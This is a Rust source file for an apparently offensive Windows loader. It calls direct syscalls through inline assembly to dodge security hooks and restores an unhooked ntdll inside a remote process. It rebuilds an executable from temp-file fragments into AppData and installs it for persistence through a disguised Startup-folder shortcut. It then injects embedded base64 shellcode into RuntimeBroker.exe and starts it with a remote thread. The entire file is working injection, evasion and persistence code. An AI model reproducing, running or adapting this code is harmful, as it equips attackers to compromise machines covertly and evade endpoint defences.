// main.rs

use std::mem;
use core::arch::global_asm;
use windows::{
    Win32::System::Diagnostics::ToolHelp::*,
    Win32::Foundation::*,
};
use windows_sys::Win32::System::Threading::{PROCESS_ALL_ACCESS, PROCESS_BASIC_INFORMATION, ProcessBasicInformation};
use windows_sys::Win32::System::WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES};
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS, UNICODE_STRING};
use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
use windows_sys::Win32::System::Kernel::{OBJ_CASE_INSENSITIVE};
use windows_sys::Win32::Storage::FileSystem::{FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_OPEN, FILE_OVERWRITE_IF, FILE_ATTRIBUTE_NORMAL};
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
use windows_sys::Win32::Storage::FileSystem::{FILE_STANDARD_INFO, FileStandardInfo};
use base64::{Engine as _, engine::general_purpose};

mod syscall;

#[repr(C)]
#[allow(non_snake_case)]
pub struct IO_STATUS_BLOCK {
    pub Pointer: *mut std::ffi::c_void,
    pub Information: usize,
}

impl Default for IO_STATUS_BLOCK {
    fn default() -> Self {
        unsafe { mem::zeroed() }
    }
}

global_asm!(r#"
.global asm_nt_open_process
asm_nt_open_process:
    mov r10, rcx
    mov eax, [rsp + 0x28]
    syscall
    ret

.global asm_nt_allocate_virtual_memory
asm_nt_allocate_virtual_memory:
    mov r10, rcx
    mov eax, [rsp + 0x38]
    syscall
    ret

.global asm_nt_write_virtual_memory
asm_nt_write_virtual_memory:
    mov r10, rcx
    mov eax, [rsp + 0x30]
    syscall
    ret

.global asm_nt_create_thread_ex
asm_nt_create_thread_ex:
    mov r10, rcx
    mov eax, [rsp + 0x60]
    syscall
    ret

.global asm_nt_close
asm_nt_close:
    mov r10, rcx
    mov eax, edx
    syscall
    ret

.global asm_nt_protect_virtual_memory
asm_nt_protect_virtual_memory:
    mov r10, rcx
    mov eax, [rsp + 0x30]
    syscall
    ret

.global asm_nt_read_virtual_memory
asm_nt_read_virtual_memory:
    mov r10, rcx
    mov eax, [rsp + 0x30]
    syscall
    ret

.global asm_nt_query_information_process
asm_nt_query_information_process:
    mov r10, rcx
    mov eax, [rsp + 0x30]
    syscall
    ret

.global asm_nt_create_file
asm_nt_create_file:
    mov r10, rcx
    mov eax, [rsp + 0x60]
    syscall
    ret

.global asm_nt_read_file
asm_nt_read_file:
    mov r10, rcx
    mov eax, [rsp + 0x50]
    syscall
    ret

.global asm_nt_write_file
asm_nt_write_file:
    mov r10, rcx
    mov eax, [rsp + 0x50]
    syscall
    ret

.global asm_nt_query_information_file
asm_nt_query_information_file:
    mov r10, rcx
    mov eax, [rsp + 0x30]
    syscall
    ret
"#);

extern "C" {
    fn asm_nt_open_process(ProcessHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: &mut OBJECT_ATTRIBUTES, ClientId: &mut CLIENT_ID, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_allocate_virtual_memory(ProcessHandle: HANDLE, BaseAddress: &mut *mut std::ffi::c_void, ZeroBits: u32, RegionSize: &mut usize, AllocationType: u32, Protect: u32, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_write_virtual_memory(ProcessHandle: HANDLE, BaseAddress: *mut std::ffi::c_void, Buffer: *const std::ffi::c_void, NumberOfBytesToWrite: usize, NumberOfBytesWritten: &mut usize, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_create_thread_ex(ThreadHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: *mut OBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: *mut std::ffi::c_void, Argument: *mut std::ffi::c_void, CreateFlags: u32, ZeroBits: usize, StackSize: usize, MaximumStackSize: usize, AttributeList: *mut std::ffi::c_void, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_close(Handle: HANDLE, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_protect_virtual_memory(ProcessHandle: HANDLE, BaseAddress: &mut *mut std::ffi::c_void, NumberOfBytesToProtect: &mut usize, NewProperty: u32, OldProperty: &mut u32, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_read_virtual_memory(ProcessHandle: HANDLE, BaseAddress: *const std::ffi::c_void, Buffer: *mut std::ffi::c_void, NumberOfBytesToRead: usize, NumberOfBytesRead: &mut usize, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_query_information_process(ProcessHandle: HANDLE, ProcessInformationClass: u32, ProcessInformation: *mut std::ffi::c_void, ProcessInformationLength: u32, ReturnLength: &mut u32, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_create_file(FileHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: *mut OBJECT_ATTRIBUTES, IoStatusBlock: *mut IO_STATUS_BLOCK, AllocationSize: *mut i64, FileAttributes: u32, ShareAccess: u32, CreateDisposition: u32, CreateOptions: u32, EaBuffer: *mut std::ffi::c_void, EaLength: u32, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_read_file(FileHandle: HANDLE, Event: HANDLE, ApcRoutine: *mut std::ffi::c_void, ApcContext: *mut std::ffi::c_void, IoStatusBlock: *mut IO_STATUS_BLOCK, Buffer: *mut std::ffi::c_void, Length: u32, ByteOffset: *mut i64, Key: *mut u32, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_write_file(FileHandle: HANDLE, Event: HANDLE, ApcRoutine: *mut std::ffi::c_void, ApcContext: *mut std::ffi::c_void, IoStatusBlock: *mut IO_STATUS_BLOCK, Buffer: *const std::ffi::c_void, Length: u32, ByteOffset: *mut i64, Key: *mut u32, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_query_information_file(FileHandle: HANDLE, IoStatusBlock: *mut IO_STATUS_BLOCK, FileInformation: *mut std::ffi::c_void, Length: u32, FileInformationClass: u32, syscall_id: u32) -> NTSTATUS;
}

const SHELLCODE: &str = "/EiB5PD////o0AAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0b0gB0FCLSBhEi0AgSQHQ41xI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpT////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VSGVsbG8gZnJvbSBKdWxlcyEASnVsZXMA";

fn get_module_base_address(process_handle: HANDLE, module_name: &str) -> Option<usize> {
    let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { mem::zeroed() };
    let mut return_len = 0;
    let nt_query_info_syscall = syscall::get_syscall_number("NtQueryInformationProcess")?;
    let nt_read_mem_syscall = syscall::get_syscall_number("NtReadVirtualMemory")?;

    let status = unsafe {
        asm_nt_query_information_process(
            process_handle,
            ProcessBasicInformation as u32,
            &mut pbi as *mut _ as *mut _,
            mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_len,
            nt_query_info_syscall,
        )
    };

    if status != 0 { return None; }

    let peb_base = pbi.PebBaseAddress;
    let mut ldr_ptr: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut bytes_read = 0;

    unsafe {
        asm_nt_read_virtual_memory(
            process_handle,
            (peb_base as usize + 0x18) as *const _,
            &mut ldr_ptr as *mut _ as *mut _,
            mem::size_of::<*mut std::ffi::c_void>(),
            &mut bytes_read,
            nt_read_mem_syscall,
        );
    }

    let mut list_head = [0usize; 2];
    unsafe {
        asm_nt_read_virtual_memory(
            process_handle,
            (ldr_ptr as usize + 0x10) as *const _,
            list_head.as_mut_ptr() as *mut _,
            mem::size_of::<[usize; 2]>(),
            &mut bytes_read,
            nt_read_mem_syscall,
        );
    }

    let mut current_node = list_head[0];
    while current_node != (ldr_ptr as usize + 0x10) {
        let mut dll_base = 0usize;
        unsafe {
            asm_nt_read_virtual_memory(
                process_handle,
                (current_node + 0x30) as *const _,
                &mut dll_base as *mut _ as *mut _,
                mem::size_of::<usize>(),
                &mut bytes_read,
                nt_read_mem_syscall,
            );
        }

        let mut base_name_ptr = 0usize;
        let mut base_name_len = 0u16;
        unsafe {
            asm_nt_read_virtual_memory(
                process_handle,
                (current_node + 0x58) as *const _,
                &mut base_name_len as *mut _ as *mut _,
                2,
                &mut bytes_read,
                nt_read_mem_syscall,
            );
            asm_nt_read_virtual_memory(
                process_handle,
                (current_node + 0x60) as *const _,
                &mut base_name_ptr as *mut _ as *mut _,
                mem::size_of::<usize>(),
                &mut bytes_read,
                nt_read_mem_syscall,
            );
        }

        let mut name_bytes = vec![0u16; (base_name_len / 2) as usize];
        unsafe {
            asm_nt_read_virtual_memory(
                process_handle,
                base_name_ptr as *const _,
                name_bytes.as_mut_ptr() as *mut _,
                base_name_len as usize,
                &mut bytes_read,
                nt_read_mem_syscall,
            );
        }

        let current_module_name = String::from_utf16_lossy(&name_bytes);
        if current_module_name.eq_ignore_ascii_case(module_name) {
            return Some(dll_base);
        }

        unsafe {
            asm_nt_read_virtual_memory(
                process_handle,
                current_node as *const _,
                &mut current_node as *mut _ as *mut _,
                mem::size_of::<usize>(),
                &mut bytes_read,
                nt_read_mem_syscall,
            );
        }
    }

    None
}

fn unhook_remote_ntdll(process_handle: HANDLE, remote_base: usize) {
    let ntdll_bytes = std::fs::read("C:\\Windows\\System32\\ntdll.dll").expect("Failed to read ntdll.dll");
    let dos_header = ntdll_bytes.as_ptr() as *const IMAGE_DOS_HEADER;
    let nt_headers = unsafe { (ntdll_bytes.as_ptr() as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64 };
    let section_header = (nt_headers as usize + mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
    let num_sections = unsafe { (*nt_headers).FileHeader.NumberOfSections };

    for i in 0..num_sections {
        let section = unsafe { *section_header.add(i as usize) };
        let name_bytes = &section.Name;
        let name = std::str::from_utf8(name_bytes).unwrap_or("").trim_matches('\0');

        if name == ".text" {
            let virtual_address = section.VirtualAddress as usize;
            let size_of_raw_data = section.SizeOfRawData as usize;
            let pointer_to_raw_data = section.PointerToRawData as usize;

            let clean_text = &ntdll_bytes[pointer_to_raw_data..pointer_to_raw_data + size_of_raw_data];
            let remote_text_addr = remote_base + virtual_address;

            let nt_protect_syscall = syscall::get_syscall_number("NtProtectVirtualMemory").expect("Syscall not found");
            let nt_write_syscall = syscall::get_syscall_number("NtWriteVirtualMemory").expect("Syscall not found");

            let mut old_protect = 0u32;
            let mut protect_addr = remote_text_addr as *mut std::ffi::c_void;
            let mut protect_size = size_of_raw_data;

            unsafe {
                asm_nt_protect_virtual_memory(
                    process_handle,
                    &mut protect_addr,
                    &mut protect_size,
                    PAGE_EXECUTE_READWRITE,
                    &mut old_protect,
                    nt_protect_syscall,
                );

                let mut bytes_written = 0;
                asm_nt_write_virtual_memory(
                    process_handle,
                    remote_text_addr as *mut std::ffi::c_void,
                    clean_text.as_ptr() as *const _,
                    size_of_raw_data,
                    &mut bytes_written,
                    nt_write_syscall,
                );

                asm_nt_protect_virtual_memory(
                    process_handle,
                    &mut protect_addr,
                    &mut protect_size,
                    old_protect,
                    &mut old_protect,
                    nt_protect_syscall,
                );
            }
            break;
        }
    }
}

fn reconstruct_exe(dest_path: &str) -> Option<()> {
    let temp_dir = std::env::temp_dir();
    let files = ["1.tmp", "2.tmp", "3.tmp"];
    let mut combined_bytes = Vec::new();

    let nt_create_file_syscall = syscall::get_syscall_number("NtCreateFile")?;
    let nt_read_file_syscall = syscall::get_syscall_number("NtReadFile")?;
    let nt_query_info_file_syscall = syscall::get_syscall_number("NtQueryInformationFile")?;
    let nt_write_file_syscall = syscall::get_syscall_number("NtWriteFile")?;
    let nt_close_syscall = syscall::get_syscall_number("NtClose")?;

    for file_name in files {
        let file_path = temp_dir.join(file_name);
        let file_path_str = format!("\\??\\{}", file_path.to_str()?);
        let mut file_path_u16: Vec<u16> = file_path_str.encode_utf16().collect();
        file_path_u16.push(0);

        let mut handle: HANDLE = 0;
        let mut io_status = IO_STATUS_BLOCK::default();
        let mut name = UNICODE_STRING {
            Length: ((file_path_u16.len() - 1) * 2) as u16,
            MaximumLength: (file_path_u16.len() * 2) as u16,
            Buffer: file_path_u16.as_mut_ptr(),
        };
        let mut attr = OBJECT_ATTRIBUTES {
            Length: mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
            RootDirectory: 0,
            ObjectName: &mut name,
            Attributes: OBJ_CASE_INSENSITIVE as u32,
            SecurityDescriptor: std::ptr::null_mut(),
            SecurityQualityOfService: std::ptr::null_mut(),
        };

        let status = unsafe {
            asm_nt_create_file(
                &mut handle,
                FILE_GENERIC_READ,
                &mut attr,
                &mut io_status,
                std::ptr::null_mut(),
                FILE_ATTRIBUTE_NORMAL,
                FILE_SHARE_READ,
                FILE_OPEN,
                FILE_SYNCHRONOUS_IO_NONALERT,
                std::ptr::null_mut(),
                0,
                nt_create_file_syscall,
            )
        };
        if status != 0 { continue; }

        let mut fsi = FILE_STANDARD_INFO {
            AllocationSize: 0,
            EndOfFile: 0,
            NumberOfLinks: 0,
            DeletePending: 0,
            Directory: 0,
        };
        unsafe {
            asm_nt_query_information_file(
                handle,
                &mut io_status,
                &mut fsi as *mut _ as *mut _,
                mem::size_of::<FILE_STANDARD_INFO>() as u32,
                FileStandardInfo as u32,
                nt_query_info_file_syscall,
            );
        }
        let file_size = fsi.EndOfFile as usize;
        let mut buffer = vec![0u8; file_size];
        unsafe {
            asm_nt_read_file(
                handle,
                0,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                &mut io_status,
                buffer.as_mut_ptr() as *mut _,
                file_size as u32,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                nt_read_file_syscall,
            );
            asm_nt_close(handle, nt_close_syscall);
        }
        combined_bytes.extend_from_slice(&buffer);
    }

    if combined_bytes.is_empty() { return None; }

    let dest_exe_str = format!("\\??\\{}", dest_path);
    let mut dest_exe_u16: Vec<u16> = dest_exe_str.encode_utf16().collect();
    dest_exe_u16.push(0);

    let mut dest_handle: HANDLE = 0;
    let mut io_status = IO_STATUS_BLOCK::default();
    let mut dest_name = UNICODE_STRING {
        Length: ((dest_exe_u16.len() - 1) * 2) as u16,
        MaximumLength: (dest_exe_u16.len() * 2) as u16,
        Buffer: dest_exe_u16.as_mut_ptr(),
    };
    let mut dest_attr = OBJECT_ATTRIBUTES {
        Length: mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: 0,
        ObjectName: &mut dest_name,
        Attributes: OBJ_CASE_INSENSITIVE as u32,
        SecurityDescriptor: std::ptr::null_mut(),
        SecurityQualityOfService: std::ptr::null_mut(),
    };

    let status = unsafe {
        asm_nt_create_file(
            &mut dest_handle,
            FILE_GENERIC_WRITE,
            &mut dest_attr,
            &mut io_status,
            std::ptr::null_mut(),
            FILE_ATTRIBUTE_NORMAL,
            0,
            FILE_OVERWRITE_IF,
            FILE_SYNCHRONOUS_IO_NONALERT,
            std::ptr::null_mut(),
            0,
            nt_create_file_syscall,
        )
    };
    if status != 0 { return None; }

    unsafe {
        asm_nt_write_file(
            dest_handle,
            0,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut io_status,
            combined_bytes.as_ptr() as *const _,
            combined_bytes.len() as u32,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            nt_write_file_syscall,
        );
        asm_nt_close(dest_handle, nt_close_syscall);
    }

    Some(())
}

fn set_persistence(exe_path: &str) -> Option<()> {
    let app_data = std::env::var("APPDATA").ok()?;
    let startup_path = format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsBroker.url", app_data);
    let nt_startup_path = format!("\\??\\{}", startup_path);
    let mut nt_startup_u16: Vec<u16> = nt_startup_path.encode_utf16().collect();
    nt_startup_u16.push(0);

    let shortcut_content = format!("[InternetShortcut]\nURL=file:///{}\n", exe_path.replace("\\", "/"));
    let shortcut_bytes = shortcut_content.as_bytes();

    let nt_create_file_syscall = syscall::get_syscall_number("NtCreateFile")?;
    let nt_write_file_syscall = syscall::get_syscall_number("NtWriteFile")?;
    let nt_close_syscall = syscall::get_syscall_number("NtClose")?;

    let mut handle: HANDLE = 0;
    let mut io_status = IO_STATUS_BLOCK::default();
    let mut name = UNICODE_STRING {
        Length: ((nt_startup_u16.len() - 1) * 2) as u16,
        MaximumLength: (nt_startup_u16.len() * 2) as u16,
        Buffer: nt_startup_u16.as_mut_ptr(),
    };
    let mut attr = OBJECT_ATTRIBUTES {
        Length: mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: 0,
        ObjectName: &mut name,
        Attributes: OBJ_CASE_INSENSITIVE as u32,
        SecurityDescriptor: std::ptr::null_mut(),
        SecurityQualityOfService: std::ptr::null_mut(),
    };

    let status = unsafe {
        asm_nt_create_file(
            &mut handle,
            FILE_GENERIC_WRITE,
            &mut attr,
            &mut io_status,
            std::ptr::null_mut(),
            FILE_ATTRIBUTE_NORMAL,
            0,
            FILE_OVERWRITE_IF,
            FILE_SYNCHRONOUS_IO_NONALERT,
            std::ptr::null_mut(),
            0,
            nt_create_file_syscall,
        )
    };

    if status == 0 {
        unsafe {
            asm_nt_write_file(
                handle,
                0,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                &mut io_status,
                shortcut_bytes.as_ptr() as *const _,
                shortcut_bytes.len() as u32,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                nt_write_file_syscall,
            );
            asm_nt_close(handle, nt_close_syscall);
        }
    }

    Some(())
}

fn get_process_pid() -> Option<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).unwrap();
        if snapshot.is_invalid() {
            return None;
        }

        let mut process_entry: PROCESSENTRY32 = mem::zeroed();
        process_entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;

        if Process32First(snapshot, &mut process_entry).as_bool() {
            loop {
                let end = process_entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                let bytes = std::slice::from_raw_parts(process_entry.szExeFile.as_ptr() as *const u8, end);
                let process_name = String::from_utf8_lossy(bytes);
                if process_name == "RuntimeBroker.exe" {
                    CloseHandle(snapshot);
                    return Some(process_entry.th32ProcessID);
                }

                if !Process32Next(snapshot, &mut process_entry).as_bool() {
                    break;
                }
            }
        }
        CloseHandle(snapshot);
    }
    None
}

fn main() {
    let app_data = std::env::var("APPDATA").unwrap_or_else(|_| "C:\\".to_string());
    let dest_path = format!("{}\\Microsoft\\Windows\\Broker.exe", app_data);

    if let Some(_) = reconstruct_exe(&dest_path) {
        set_persistence(&dest_path);
    }

    let target_pid = get_process_pid().expect("Process not found");
    let shellcode = general_purpose::STANDARD.decode(SHELLCODE).expect("Invalid shellcode");

    let mut process_handle: HANDLE = 0;
    let mut object_attributes: OBJECT_ATTRIBUTES = unsafe { mem::zeroed() };
    let mut client_id: CLIENT_ID = unsafe { mem::zeroed() };
    client_id.UniqueProcess = target_pid as _;

    let nt_open_process_syscall = syscall::get_syscall_number("NtOpenProcess").expect("Syscall not found");

    let status = unsafe {
        asm_nt_open_process(
            &mut process_handle,
            PROCESS_ALL_ACCESS,
            &mut object_attributes,
            &mut client_id,
            nt_open_process_syscall,
        )
    };

    if status != 0 { return; }

    if let Some(ntdll_base) = get_module_base_address(process_handle, "ntdll.dll") {
        unhook_remote_ntdll(process_handle, ntdll_base);
    }

    let mut alloc_addr: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut size = shellcode.len();
    let nt_allocate_virtual_memory_syscall = syscall::get_syscall_number("NtAllocateVirtualMemory").expect("Syscall not found");

    let status = unsafe {
        asm_nt_allocate_virtual_memory(
            process_handle,
            &mut alloc_addr,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
            nt_allocate_virtual_memory_syscall,
        )
    };

    if status != 0 { return; }

    let mut bytes_written = 0;
    let nt_write_virtual_memory_syscall = syscall::get_syscall_number("NtWriteVirtualMemory").expect("Syscall not found");

    let status = unsafe {
        asm_nt_write_virtual_memory(
            process_handle,
            alloc_addr,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            &mut bytes_written,
            nt_write_virtual_memory_syscall,
        )
    };

    if status != 0 { return; }

    let mut thread_handle: HANDLE = 0;
    let nt_create_thread_ex_syscall = syscall::get_syscall_number("NtCreateThreadEx").expect("Syscall not found");

    let status = unsafe {
        asm_nt_create_thread_ex(
            &mut thread_handle,
            PROCESS_ALL_ACCESS,
            std::ptr::null_mut(),
            process_handle,
            alloc_addr,
            std::ptr::null_mut(),
            0,
            0,
            0,
            0,
            std::ptr::null_mut(),
            nt_create_thread_ex_syscall,
        )
    };

    if status != 0 { return; }

    let nt_close_syscall = syscall::get_syscall_number("NtClose").expect("Syscall not found");

    unsafe {
        asm_nt_close(thread_handle, nt_close_syscall);
        asm_nt_close(process_handle, nt_close_syscall);
    }
}
